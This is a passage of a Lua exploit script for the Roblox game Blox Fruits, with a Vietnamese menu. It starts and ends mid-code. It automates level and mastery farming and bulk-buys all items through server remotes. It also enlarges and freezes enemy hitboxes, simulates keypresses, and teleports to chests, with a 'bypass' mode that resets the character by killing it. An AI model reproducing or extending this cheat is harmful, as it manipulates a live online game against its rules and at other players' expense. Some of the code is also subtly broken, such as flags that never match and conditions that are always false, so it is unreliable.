        _G.AutoLevel=Value
        StopTween(_G.AutoLevel)
    end)
    Options.ToggleLevel:SetValue(false)
    spawn(function()
        while task.wait() do
        if _G.AutoLevel then
        pcall(function()
          CheckLevel()
          if not string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==false then
          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
          Tween(CFrameQ)
          if (CFrameQ.Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest",NameQuest,QuestLv)
          end
          elseif string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==true then
          for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
          if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
          if v.Name==Ms then
          repeat wait(_G.Fast_Delay)
          
                    bringmob=true
          Click()
          
          
          AutoHaki()
          EquipWeapon(SelectWeapon)
          Tween(v.HumanoidRootPart.CFrame*Pos)
          v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
          v.HumanoidRootPart.Transparency=1
          v.Humanoid.JumpPower=0
          v.Humanoid.WalkSpeed=0
          v.HumanoidRootPart.CanCollide=false
          FarmPos=v.HumanoidRootPart.CFrame
          MonFarm=v.Name
          until not _G.AutoLevel or not v.Parent or v.Humanoid.Health<=0 or not game:GetService("Workspace").Enemies:FindFirstChild(v.Name) or game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible==false
          bringmob=false
        end   
          end
          end
          for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
          if string.find(v.Name,NameMon) then
          if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.Position).Magnitude>=1000000000 then
            Tween(v.HumanoidRootPart.CFrame*Pos)
          end
          end
          end
          end
          end)
        end
        end
        end)        

       local ToggleLevelKaitun = Tabs.Main:AddToggle("ToggleLevelKaitun", {
        Title="Cày Cấp Và Mua Full Item",
        Description="",
        Default=false })
    ToggleLevelKaitun:OnChanged(function(Value)
        _G.AutoLevel = Value
        _G.BuyEverything = Value
        _G.Stats_Kaitun = Value
        _G.SaveSpawn = Value
        _G.AutoKen = Value
        _G.RemoveDameText = Value
        RemoveNotify = Value
        StopTween(_G.AutoLevel)
        StopTween(_G.BuyEverything)
        StopTween(_G.Stats_Kaitun)
        StopTween(_G.RemoveDameText)
        StopTween(RemoveNotify)
    end)
    Options.ToggleLevelKaitun:SetValue(false)
    spawn(function()
    while wait(1) do
        if _G.BuyEverything then
            pcall(function()
                -- Mua khả năng
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk", "Buy")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Geppo")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Buso")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki", "Soru")

                -- Mua vũ khí
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cutlass")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Katana")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Iron Mace")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Triple Katana")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Duel Katana")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Pipe")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual-Headed Blade")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Bisento")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Soul Cane")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ThunderGodTalk")

                -- Mua súng
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Musket")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Slingshot")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Flintlock")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Slingshot")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual Flintlock")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cannon")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Slingshot", "2")

                -- Mua phụ kiện
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Swordsman Hat")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Tomoe Ring")
                
                -- Mua võ
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")          
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")        
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")        
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate",true)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")        
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")        
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")      
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
            end)
        end
    end
end) -- Đây là end bạn bị thiếu
    local ToggleMobAura = Tabs.Main:AddToggle("ToggleMobAura", {
        Title="Đấm Quái Gần",
        Description="",
        Default=false })
    ToggleMobAura:OnChanged(function(Value)
        _G.AutoNear=Value
        if Value==false then
            wait()
            Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
            wait()
        end
    end)
    Options.ToggleMobAura:SetValue(false)
    spawn(function()
        while wait() do
        if _G.AutoNear then
        pcall(function()
          for i,v in pairs (game.Workspace.Enemies:GetChildren()) do
          if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
          if v.Name then
          if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v:FindFirstChild("HumanoidRootPart").Position).Magnitude<=1000000000 then
            repeat wait(_G.Fast_Delay)
                
                bringmob=true
                Click()
          Click()


AutoHaki()
          EquipWeapon(SelectWeapon)
          Tween(v.HumanoidRootPart.CFrame*Pos)
          v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
          v.HumanoidRootPart.Transparency=1
          v.Humanoid.JumpPower=0
          v.Humanoid.WalkSpeed=0
          v.HumanoidRootPart.CanCollide=false
          FarmPos=v.HumanoidRootPart.CFrame
          MonFarm=v.Name
          until not _G.AutoNear or not v.Parent or v.Humanoid.Health<=0 or not game.Workspace.Enemies:FindFirstChild(v.Name)
          bringmob=false
        end
          end
          end
          end
          end)
        end
        end
      end)
    local ToggleCastleRaid = Tabs.Main:AddToggle("ToggleCastleRaid", {
        Title="Đấm Hải Tặc",
        Description="", 
        Default=false })
    ToggleCastleRaid:OnChanged(function(Value)
        _G.CastleRaid=Value
    end)
    Options.ToggleCastleRaid:SetValue(false)
    spawn(function()
        while wait() do
            if _G.CastleRaid then
                pcall(function()
                    local CFrameCastleRaid = CFrame.new(-5496.17432, 313.768921,-2841.53027, 0.924894512, 7.37058015e-09, 0.380223751, 3.5881019e-08, 1,-1.06665446e-07,-0.380223751, 1.12297109e-07, 0.924894512)
                    if (CFrame.new(-5539.3115234375, 313.800537109375,-2972.372314453125).Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if _G.CastleRaid and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health>0 then
                                if (v.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<1000000000 then
                                    repeat wait(_G.Fast_Delay)
                                        
                                        Click()
                                        
                                        
                                        AutoHaki()
                                        EquipWeapon(SelectWeapon)
                                        v.HumanoidRootPart.CanCollide=false
                                        v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                    until v.Humanoid.Health<=0 or not v.Parent or not _G.CastleRaid
                                end
                            end
                        end
                    else
                        Tween(CFrameCastleRaid)
                    end
                end)
            end
        end
        end)
local ToggleHakiFortress = Tabs.Main:AddToggle("ToggleHakiFortress", { 
    Title="Bật Haki Màu Pháo Đài", 
    Description="", 
    Default=false 
})
ToggleHakiFortress:OnChanged(function(Value)
    _G.EnableHakiFortress=Value
end)
Options.ToggleHakiFortress:SetValue(false)
local function EquipAuraAndTeleport(storageName, targetPosition)
    local args = {
        [1]={
            ["StorageName"]=storageName,
            ["Type"]="AuraSkin",
            ["Context"]="Equip"
        }
    }
    game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/FruitCustomizerRF"):InvokeServer(unpack(args))
    Tween(targetPosition)
end
local function IsAtPosition(targetPosition, tolerance)
    local character = game.Players.LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        return false
    end
    local characterPosition = character.HumanoidRootPart.Position
    return (characterPosition-targetPosition).Magnitude<tolerance
end
spawn(function()
    while true do
        if _G.EnableHakiFortress then
            EquipAuraAndTeleport("Snow White", Vector3.new(-4971.71826171875, 335.9582214355469,-3720.0595703125))
            while not IsAtPosition(Vector3.new(-4971.71826171875, 335.9582214355469,-3720.0595703125), 1) do
                wait(0.1)
            end
            wait(0.5) 
            EquipAuraAndTeleport("Pure Red", Vector3.new(-5414.92041015625, 314.2582092285156,-2212.20166015625))
            while not IsAtPosition(Vector3.new(-5414.92041015625, 314.2582092285156,-2212.20166015625), 1) do
                wait(0.1)
            end
            wait(0.5) 
            EquipAuraAndTeleport("Winter Sky", Vector3.new(-5420.26318359375, 1089.3582763671875,-2666.8193359375))
            while not IsAtPosition(Vector3.new(-5420.26318359375, 1089.3582763671875,-2666.8193359375), 1) do
                wait(0.1)
            end
            wait(0.5) 
            _G.EnableHakiFortress=false
        end
        wait(0.5)
    end
end)
local ToggleCollectChest = Tabs.Main:AddToggle("ToggleCollectChest", {
    Title = "Lụm Rương",
    Description = "",
    Default = false
})
ToggleCollectChest:OnChanged(function(Value)
    _G.AutoCollectChest = Value
end)
spawn(function()
    while wait() do
        if _G.AutoCollectChest then
            local Players = game:GetService("Players")
            local Player = Players.LocalPlayer 
            local Character = Player.Character or Player.CharacterAdded:Wait()
            local Position = Character:GetPivot().Position
            local CollectionService = game:GetService("CollectionService")
            local Chests = CollectionService:GetTagged("_ChestTagged") 
            local Distance, Nearest = math.huge
            for i = 1, #Chests do
                local Chest = Chests[i]
                local Magnitude = (Chest:GetPivot().Position - Position).Magnitude
                if not Chest:GetAttribute("IsDisabled") and Magnitude < Distance then
                    Distance, Nearest = Magnitude, Chest
                end
            end
            if Nearest then
                local ChestPosition = Nearest:GetPivot().Position
                local CFrameTarget = CFrame.new(ChestPosition)
                Tween(CFrameTarget) 
            end
        end
    end
end)
local ToggleChestBypas = Tabs.Main:AddToggle("ToggleChestBypas", {
    Title = "Lụm Rương Bypass",
    Description = "",
    Default = false
})
ToggleChestBypas:OnChanged(function(Value)
	_G.ChestBypass = Value
end)

spawn(function()
    while wait() do
        if _G.ChestBypass then
            local Players = game:GetService("Players")
            local Player = Players.LocalPlayer
            local CollectionService = game:GetService("CollectionService")
            local Character = Player.Character or Player.CharacterAdded:Wait()
            local StartTime = tick()
            while tick() - StartTime < 4 do
                Character = Player.Character or Player.CharacterAdded:Wait()
                local Position = Character:GetPivot().Position
                local Chests = CollectionService:GetTagged("_ChestTagged")
                local Distance, Nearest = math.huge
                for i = 1, #Chests do
                    local Chest = Chests[i]
                    local Magnitude = (Chest:GetPivot().Position - Position).Magnitude
                    if (not Chest:GetAttribute("IsDisabled") and (Magnitude < Distance)) then
                        Distance, Nearest = Magnitude, Chest
                    end
                end
                if Nearest then
                    local ChestPosition = Nearest:GetPivot().Position
                    Character:PivotTo(CFrame.new(ChestPosition))
                    task.wait(0.2)
                else
                    break
                end
            end
            if Player.Character then
                Player.Character:BreakJoints()
                Player.CharacterAdded:Wait()
            end
        end
    end
end)

local ToggleChestItems = Tabs.Main:AddToggle("ToggleChestItems", {
    Title = "Tự Động Dừng Khi Có Item",
    Description = "",
    Default = false
})
ToggleChestItems:OnChanged(function(Value)
	_G.StopItemsChest = Value
end)

spawn(function()
    while wait() do
        pcall(function()
            if _G.StopItemsChest then
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") then
                    _G.ChestBypass = false
                    Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
                end
            end
        end)
    end
end)
local ToggleCollectBerry = Tabs.Main:AddToggle("ToggleCollectBerry", {
    Title = "Bay Đến Khu Vực Có Berry+Hop",
    Description = "",
    Default = false
})
ToggleCollectBerry:OnChanged(function(Value)
    _G.AutoCollectBerry = Value
end)
spawn(function()
    while wait() do
        if _G.CollectBerry then
            local Players = game:GetService("Players")
            local Player = Players.LocalPlayer
            local Character = Player.Character or Player.CharacterAdded:Wait()
            local Position = Character:GetPivot().Position
            local CollectionService = game:GetService("CollectionService")
            local BerryBushes = CollectionService:GetTagged("BerryBush")
            local Distance, NearestBush, NearestBerryName = math.huge, nil, nil

            for _, Bush in ipairs(BerryBushes) do
                for AttributeName, _ in pairs(Bush:GetAttributes()) do
                    local Magnitude = (Bush.Parent:GetPivot().Position - Position).Magnitude
                    if Magnitude < Distance then
                        Distance = Magnitude
                        NearestBush = Bush
                        NearestBerryName = AttributeName
                    end
                end
            end

            if NearestBush and NearestBerryName then
                local BushModel = NearestBush.Parent
                local BushCenter = BushModel:GetPivot().Position

                -- Bay vào trong bụi cây
                Tween(CFrame.new(BushCenter + Vector3.new(0, 2, 0)))
                task.wait(0.5)

                -- Tìm object thật sự là trái berry (theo tên attribute)
                local BerryPart = BushModel:FindFirstChild(NearestBerryName)
                if BerryPart and BerryPart:IsA("BasePart") then
                    -- Bay đến đúng vị trí trái berry
                    Tween(BerryPart.CFrame + Vector3.new(0, 1, 0)) -- bay hơi trên trái berry một tí
                    task.wait(0.3)

                    -- Nhấn E để nhặt berry
                    local VirtualInput = game:GetService("VirtualInputManager")
                    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                    task.wait(0.1)
                    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                end
            else
                if _G.CollectBerryHop then
                    Hop()
                end
            end
        end
    end
end)

local Mastery = Tabs.Main:AddSection("Thông Thạo")
local DropdownMastery = Tabs.Main:AddDropdown("DropdownMastery", {
    Title = "Chọn Loại",
    Description = "",
    Values = {"Level", "Level No Quest", "Near Mob", "Bone", "Cake", "Ecto"},
    Multi = false,
    Default = 1,
})
DropdownMastery:SetValue(TypeMastery)
DropdownMastery:OnChanged(function(Value)
    TypeMastery = Value
end)
local ToggleMasteryFruit = Tabs.Main:AddToggle("ToggleMasteryFruit", {
    Title = "Cày Trái",
    Description = "",
    Default = false
})
ToggleMasteryFruit:OnChanged(function(Value)
    AutoFarmMasDevilFruit = Value
end)
Options.ToggleMasteryFruit:SetValue(false)
local ToggleMasteryGun = Tabs.Main:AddToggle("ToggleMasteryGun", {
    Title = "Cày Súng",
    Description = "",
    Default = false
})
ToggleMasteryGun:OnChanged(function(Value)
    AutoFarmMasGun = Value
end)
local SliderHealt = Tabs.Main:AddSlider("SliderHealt", {
    Title = "Máu Quái",
    Description = "",
    Default = 20,
    Min = 0,
    Max = 100,
    Rounding = 1,
    Callback = function(Value)
        KillPercent = Value
    end
})
SliderHealt:OnChanged(function(Value)
    KillPercent = Value
end)
SliderHealt:SetValue(20)
spawn(function()
    while task.wait() do
        if _G.UseSkill then
            pcall(function()
                if _G.UseSkill then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == MonFarm and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                            repeat 
                                game:GetService("RunService").Heartbeat:wait()
                                EquipWeapon(game.Players.LocalPlayer.Data.DevilFruit.Value)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                PositionSkillMasteryDevilFruit = v.HumanoidRootPart.Position
                                if game:GetService("Players").LocalPlayer.Character:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value) then
                                    game:GetService("Players").LocalPlayer.Character:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).MousePos.Value = PositionSkillMasteryDevilFruit
                                    local DevilFruitMastery = game:GetService("Players").LocalPlayer.Character:FindFirstChild(game.Players.LocalPlayer.Data.DevilFruit.Value).Level.Value
                                    if SkillZ and DevilFruitMastery >= 1 then
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "Z", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "Z", false, game)
                                    end
                                    if SkillX and DevilFruitMastery >= 1 then
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "X", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "X", false, game)
                                    end
                                    if SkillC and DevilFruitMastery >= 1 then
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "C", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "C", false, game)
                                    end
                                    if SkillV and DevilFruitMastery >= 1 then
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "V", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "V", false, game)
                                    end
                                    if SkillF and DevilFruitMastery >= 1 then
                                        game:GetService("VirtualInputManager"):SendKeyEvent(true, "F", false, game)
                                        wait()
                                        game:GetService("VirtualInputManager"):SendKeyEvent(false, "F", false, game)
                                    end
                                end
                            until not AutoFarmMasDevilFruit or not _G.UseSkill or v.Humanoid.Health == 0
                        end
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasDevilFruit and TypeMastery == 'Near Mob' then
            pcall(function()
                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Name and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v:FindFirstChild("HumanoidRootPart").Position).Magnitude <= 1000000000 then
                            repeat wait(_G.Fast_Delay)
                                if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                    _G.UseSkill = true
                                else
                                    _G.UseSkill = false
                                    Click()


AutoHaki()
                                    bringmob = true
                                    EquipWeapon(SelectWeapon)
                                    Tween(v.HumanoidRootPart.CFrame * Pos)
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    v.HumanoidRootPart.Transparency = 1
                                    v.Humanoid.JumpPower = 0
                                    v.Humanoid.WalkSpeed = 0
                                    v.HumanoidRootPart.CanCollide = false
                                    FarmPos = v.HumanoidRootPart.CFrame
                                    MonFarm = v.Name
                                    
                                end
                            until not AutoFarmMasDevilFruit or not MasteryType == 'Near Mob' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Near Mob'
                            bringmob = false
                            _G.UseSkill = false
                        end
                    end
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasDevilFruit and TypeMastery == 'Ecto' then
            pcall(function()
                local EctoMob = CFrame.new(904.4072265625, 181.05767822266, 33341.38671875)
                Tween(EctoMob)
            end)
            local Distance = (Vector3.new(904.4072265625, 181.05767822266, 33341.38671875) - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 20000 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
            end
            for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == "Ship Steward" or v.Name == "Ship Engineer" or v.Name == "Ship Deckhand" or v.Name == "Ship Officer" then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkill = true
                            else
                                _G.UseSkill = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasDevilFruit or not MasteryType == 'Ecto' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Ecto'
                        bringmob = false
                        _G.UseSkill = false
                    end
                end
            end
            for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                if v.Name == "Ship Steward" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Ship Engineer" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Ship Deckhand" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Ship Officer" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasDevilFruit and TypeMastery == 'Cake' then
            pcall(function()
                local cakepos = CFrame.new(-9508.5673828125, 142.1398468017578, 5737.3603515625)
                Tween(cakepos)
            end)
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker" then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkill = true
                            else
                                _G.UseSkill = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasDevilFruit or not MasteryType == 'Cake' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Cake'
                        bringmob = false
                        _G.UseSkill = false
                    end
                end
            end
            for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                if v.Name == "Cookie Crafter" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Cake Guard" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Baking Staff" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Head Baker" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasDevilFruit and TypeMastery == 'Level No Quest' then
            pcall(function()
                CheckLevel()
                Tween(CFrameQ)
            end)
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == Ms then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkill = true
                            else
                                _G.UseSkill = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasDevilFruit or not MasteryType == 'Level No Quest' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Level No Quest'
                        bringmob = false
                        _G.UseSkill = false
                    end
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasDevilFruit and TypeMastery == 'Level' then
            pcall(function()
                CheckLevel()
                if not string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                    Tween(CFrameQ)
                end
                if (CFrameQ.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1000000000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", NameQuest, QuestLv)
                end
            end)
            if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
                if game:GetService("Workspace").Enemies:FindFirstChild(Ms) then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                            if v.Name == Ms then
                                repeat wait(_G.Fast_Delay)
                                    if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                        _G.UseSkill = true
                                    else
                                        _G.UseSkill = false
                                        Click()


AutoHaki()
                                        bringmob = true
                                        EquipWeapon(SelectWeapon)
                                        Tween(v.HumanoidRootPart.CFrame * Pos)
                                        v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.Humanoid.JumpPower = 0
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.CanCollide = false
                                        FarmPos = v.HumanoidRootPart.CFrame
                                        MonFarm = v.Name
                                        
                                    end
                                until not AutoFarmMasDevilFruit or not MasteryType == 'Level' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Level'
                                bringmob = false
                                _G.UseSkill = false
                            end
                        end
                    end
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if AutoFarmMasDevilFruit and TypeMastery == 'Bone' then
            pcall(function()
                local boneframe = CFrame.new(-9508.5673828125, 142.1398468017578, 5737.3603515625)
                Tween(boneframe)
            end)
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                    if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
                        repeat wait(_G.Fast_Delay)
                            if v.Humanoid.Health <= v.Humanoid.MaxHealth * KillPercent / 100 then
                                _G.UseSkill = true
                            else
                                _G.UseSkill = false
                                Click()


AutoHaki()
                                bringmob = true
                                EquipWeapon(SelectWeapon)
                                Tween(v.HumanoidRootPart.CFrame * Pos)
                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                v.HumanoidRootPart.Transparency = 1
                                v.Humanoid.JumpPower = 0
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                FarmPos = v.HumanoidRootPart.CFrame
                                MonFarm = v.Name
                                
                            end
                        until not AutoFarmMasDevilFruit or not MasteryType == 'Bone' or not v.Parent or v.Humanoid.Health == 0 or not TypeMastery == 'Bone'
                        bringmob = false
                        _G.UseSkill = false
                    end
                end
            end
            for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
                if v.Name == "Reborn Skeleton" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Living Zombie" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Demonic Soul" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                elseif v.Name == "Posessed Mummy" then
                    Tween(v.HumanoidRootPart.CFrame * Pos)
                end
            end
        end
    end
end)
spawn(function()
    while task.wait() do
        if _G.UseSkillGun then
            pcall(function()
                if _G.UseSkillGun then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
